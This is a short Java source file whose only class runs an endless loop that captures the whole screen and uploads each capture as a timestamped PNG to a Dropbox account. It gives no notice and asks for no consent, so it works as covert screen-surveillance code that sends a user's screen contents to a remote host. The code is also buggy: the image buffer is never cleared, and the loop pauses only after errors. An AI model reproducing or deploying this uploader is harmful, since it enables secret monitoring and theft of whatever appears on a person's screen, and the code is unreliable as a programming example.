import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    DbxClientV2 client;

        public MyThread(DbxClientV2 client) {
            this.client = client;
        }

    @Override
    public void run() {


        ByteArrayOutputStream os = new ByteArrayOutputStream();
//        InputStream is = new ByteArrayInputStream(os.toByteArray());

        for(;;)
        {
            BufferedImage image = null;
            try {
                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            } catch (AWTException e) {
                e.printStackTrace();
            }



            try {
                ImageIO.write(image, "png", os);
            } catch (IOException e) {
                e.printStackTrace();
            }

            SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
            Date now = new Date();
            formatter.format(now);


            try {
                InputStream is = new ByteArrayInputStream(os.toByteArray());
                client.files().uploadBuilder("/" + formatter.format(now) + ".png")
                        .uploadAndFinish(is);
            }
            catch (Exception ex) {
                ex.printStackTrace();

                try {
                    sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

        }
    }
}
